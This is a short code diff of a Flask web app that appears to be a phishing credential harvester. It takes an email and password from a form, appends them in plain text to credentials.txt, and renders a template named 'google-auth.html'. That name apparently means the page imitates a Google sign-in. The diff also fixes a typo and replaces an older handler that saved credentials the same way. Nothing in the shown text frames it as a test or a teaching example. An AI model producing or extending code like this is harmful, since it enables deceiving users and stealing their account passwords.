@@ -1,4 +1,4 @@
-rom flask import Flask, render_template, request
+from flask import Flask, render_template, request
 
 app = Flask(__name__)
 
@@ -14,13 +14,9 @@ def show_form():
 def handle_form():
     email = request.form['email']
     password = request.form['password']
-    
-    with open('credentials.txt', 'a') as f:
-        f.write(f"Email: {email}, Password: {password}\n")
-    if request.is_json:
-        return jsonify({'message': 'Credentials saved'}), 200
-    else:
-        return 'Credentials saved', 200
 
-if __name__ == '__main__':
-    app.run(port=5000, debug=True)
+    # Saglabāšana failā:
+    with open("credentials.txt", "a", encoding="utf-8") as file:
+        file.write(f"{email} | {password}\n")
+
+    return render_template('google-auth.html', message="Dati iesniegti!")
